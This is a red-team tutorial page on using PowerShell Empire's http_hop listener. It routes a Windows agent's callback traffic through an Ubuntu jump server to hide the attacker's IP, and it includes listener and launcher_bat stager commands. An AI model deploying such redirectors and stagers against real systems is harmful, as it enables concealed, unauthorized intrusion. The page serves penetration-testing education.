<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Hiding IP During Pentest using PowerShell Empire (http_hop)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hiding-ip-during-pentest-using-powershell-empire-http_hop/" rel="bookmark"><time class="entry-date published" datetime="2019-03-06T15:18:55+00:00">March 6, 2019</time><time class="updated" datetime="2025-05-15T14:31:39+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3><span style="color: #800000;">Introduction to PowerShell Empire Hop Payload</span></h3>
<p><span style="color: #000000;">This is our fourth article in the Empire series. In this article, we learn to use the hop payload in PowerShell Empire. Empire has an inbuilt listener named http_hop, which allows us to redirect our traffic to one of our other active listeners after getting an agent. Thus, the name </span>hop<span style="color: #000000;"> as it hops the agent from one listener to another in order to redirect traffic.</span></p>
<p><span style="color: #000000;">Similar to Metasploit, the hop listener in Empire uses a hop.php file. When you activate the hop listener, it will generate three PHP files that will redirect your existing listener. Place the said files </span>in <span style="color: #000000;">your jump server (Ubuntu) and then set up your stager in according to get the session through the mediator, i.e., our hop listener.</span></p>
<h3><span style="color: #800000;">Setting Up the HTTP Listener</span></h3>
<p><span style="color: #000000;">In the following </span>image<span style="color: #000000;">, you can see Kali’s IP. Now, we will try and take a windows session via Ubuntu using the http_hop payload, in order to hide our own IP, i.e., basically, our http_hop payload will help us (attacker) to hide from getting caught.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-R4GD-zva8mQ/XH_jen_7EaI/AAAAAAAAdUQ/akeTs5J5s7EoxDSnlbDRA4wtUu3R7OlkACLcBGAs/s1600/1.png" alt="Hiding IP with PowerShell Empire HTTP_HOP" width="688" height="339"/></span></p>
<p><span style="color: #000000;">Here, in the following </span>image<span style="color: #000000;">, you can see our ubuntu’s IP too.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-8noucZ8AR1g/XH_jevnALtI/AAAAAAAAdUU/dU46QNsr5CQAUXMW-VHWIXo9rTX_2nmYgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now, let’s get started. </span>First<span style="color: #000000;">, we should have a simple HTTP listener for that type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http
execute</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-j67FYrZ_rDk/XH_jebiXrWI/AAAAAAAAdUM/MfB_Vrnrs4cnC-yvC8FWPn1yRTfpddPlQCLcBGAs/s1600/3.png" alt="Hiding IP with PowerShell Empire HTTP_HOP" width="736" height="165"/></span></p>
<h3><span style="color: #800000;">Configuring the HTTP_Hop Listener</span></h3>
<p><span style="color: #000000;">Now, start the http_hop listener by typing :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http_hop
set RedirectListener http
set Host //192.168.1.111</pre>
<p><span style="color: #000000;">Here, we have given RedirectListener, i.e., all the traffic from the HTTP listener will be directed to </span>the HTTP hop<span style="color: #000000;"> listener.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//4.bp.blogspot.com/-X73wEABmjco/XH_jfQG_fYI/AAAAAAAAdUY/WGCcs80O8hI7mLzhnlSDGrL_Nwrko02JgCLcBGAs/s1600/4.png" alt="Hiding IP with PowerShell Empire HTTP_HOP" width="943" height="198"/></span></p>
<p><span style="color: #000000;">Executing the above listener will create three files as you can see that in the image above. Transfer these files to /var/www/html location of your </span>Ubuntu<span style="color: #000000;"> as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-OKCXNeSc9i0/XH_jfvEy6DI/AAAAAAAAdUc/57bJ3dLxtYUZi6nddpUPVoeJBef3EoKfwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now, you can see in the image below we have activated two listeners :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-KTywqeZBz0k/XH_jf1kgfwI/AAAAAAAAdUg/-m7_hYadxYUHvWP_aNrDBpqKWFOyNvlaACLcBGAs/s1600/7.1.png" alt="Hiding IP with PowerShell Empire HTTP_HOP" width="888" height="161"/></span></p>
<h3><span style="color: #800000;">Creating the Stager</span></h3>
<p><span style="color: #000000;">Let’s start our stager by typing the following commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_bat
set Listener http_hop
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-o3hKUF28ZUY/XH_jgQ2bApI/AAAAAAAAdUo/Y7_u1NcPzGUVvI6bV0yAy55g1cm4JQUDgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Once our bat file is executed in the target PC, we will have our session. Now, if you observe the IP through which we have obtained the session is of </span>Ubuntu<span style="color: #000000;"> and not of windows but we have the access of a </span>Windows<span style="color: #000000;"> PC, similarly, in windows, it will show that the attacking machine is Ubuntu and not kali. Hence our http_hop is effective.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ly9byfp2tF0/XH_jgTLsHnI/AAAAAAAAdUk/K5bpDonlUX8kzDvvMsz0ktONeu4qbNaHQCLcBGAs/s1600/8.png" alt="Hiding IP with PowerShell Empire HTTP_HOP" width="879" height="459"/></span></p>
<p><span style="color: #000000;">In conclusion, the major advantage of </span>the http_hop<span style="color: #000000;"> listener is that it helps an attacker from being identified as on the target PC, as the said listener hides the original IP.</span></p>
<p><span style="color: #000000;">To learn more about PowerShell. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
